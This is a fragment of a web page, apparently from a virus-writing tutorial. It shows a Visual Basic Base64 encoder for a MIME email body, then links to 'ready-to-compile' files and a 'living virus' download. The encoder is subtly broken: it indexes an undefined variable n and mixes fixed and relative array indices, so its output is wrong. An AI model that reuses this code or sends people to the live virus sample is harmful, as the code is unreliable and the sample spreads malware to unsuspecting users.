<br>&nbsp;&nbsp;&nbsp;b64ed = Array("A", "B", "C", "D", "E", "F", "G", "H", "I", "J", "K", "L", "M", "N", "O", "P", "Q", "R", "S", "T", "U", "V", "W", "X", "Y", "Z", "a", "b", "c", "d", "e", "f", "g", "h", "i", "j", "k", "l", "m", "n", "o", "p", "q", "r", "s", "t", "u", "v", "w", "x", "y", "z", "0", "1", "2", "3", "4", "5", "6", "7", "8", "9", "+", "/")
<p>&nbsp;&nbsp;&nbsp;Erase bin
<br>&nbsp;&nbsp;&nbsp;l = 0: i = 0: FileIn = 0: b = 0:
<br>&nbsp;&nbsp;&nbsp;s = ""
<p>&nbsp;&nbsp;&nbsp;'Gets the next free filenumber
<br>&nbsp;&nbsp;&nbsp;FileIn = FreeFile
<p>&nbsp;&nbsp;&nbsp;'Open Base64 Input File
<br>&nbsp;&nbsp;&nbsp;Open vsFullPathname For Binary As FileIn
<p>&nbsp;&nbsp;&nbsp;sResult = s & vbCrLf
<br>&nbsp;&nbsp;&nbsp;s = ""
<p>&nbsp;&nbsp;&nbsp;l = LOF(FileIn) - (LOF(FileIn) Mod 3)
<p>&nbsp;&nbsp;&nbsp;For i = 1 To l Step 3
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;'Read three bytes
<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Get FileIn, , bin(0)
<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Get FileIn, , bin(1)
<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Get FileIn, , bin(2)
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;'Always wait until there're more then 64 characters
<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;If Len(s) > 64 Then
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;s = s & vbCrLf
<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;sResult = sResult & s
<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;s = ""
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;End If
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;'Calc Base64-encoded char
<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;b = (bin(n) \ 4) And &H3F 'right shift 2 bits (&H3F=111111b)
<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;s = s & b64ed(b) 'the character s holds the encoded chars
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;b = ((bin(n) And &H3) * 16) Or ((bin(1) \ 16) And &HF)
<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;s = s & b64ed(b)
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;b = ((bin(n + 1) And &HF) * 4) Or ((bin(2) \ 64) And &H3)
<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;s = s & b64ed(b)
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;b = bin(n + 2) And &H3F
<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;s = s & b64ed(b)
<p>&nbsp;&nbsp;&nbsp;Next i
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;'Now, you need to check if there is something left
<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;If Not (LOF(FileIn) Mod 3 = 0) Then
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;'Reads the number of bytes left
<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;For i = 1 To (LOF(FileIn) Mod 3)
<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Get FileIn, , bin(i - 1)
<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Next i
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;'If there are only 2 chars left
<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;If (LOF(FileIn) Mod 3) = 2 Then
<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;b = (bin(0) \ 4) And &H3F 'right shift 2 bits (&H3F=111111b)
<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;s = s & b64ed(b)
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;b = ((bin(0) And &H3) * 16) Or ((bin(1) \ 16) And &HF)
<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;s = s & b64ed(b)
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;b = ((bin(1) And &HF) * 4) Or ((bin(2) \ 64) And &H3)
<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;s = s & b64ed(b)
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;s = s & "="
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Else 'If there is only one char left
<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;b = (bin(0) \ 4) And &H3F 'right shift 2 bits (&H3F=111111b)
<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;s = s & b64ed(b)
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;b = ((bin(0) And &H3) * 16) Or ((bin(1) \ 16) And &HF)
<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;s = s & b64ed(b)
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;s = s & "=="
<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;End If
<br>&nbsp;&nbsp;&nbsp;End If
<p>&nbsp;&nbsp;&nbsp;'Send the characters left
<br>&nbsp;&nbsp;&nbsp;If s <> "" Then
<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;s = s & vbCrLf
<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;sResult = sResult & s
<br>&nbsp;&nbsp;&nbsp;End If
<p>&nbsp;&nbsp;&nbsp;'Send the last part of the MIME Body
<br>&nbsp;&nbsp;&nbsp;s = ""
<p>&nbsp;&nbsp;&nbsp;Close FileIn
<br>&nbsp;&nbsp;&nbsp;b64 = sResult
<p>End Function
<p><a href="181.zip">"ready-to-compile" files</a>
<p><a href="182.zip">living virus</a>
</body>
</html>
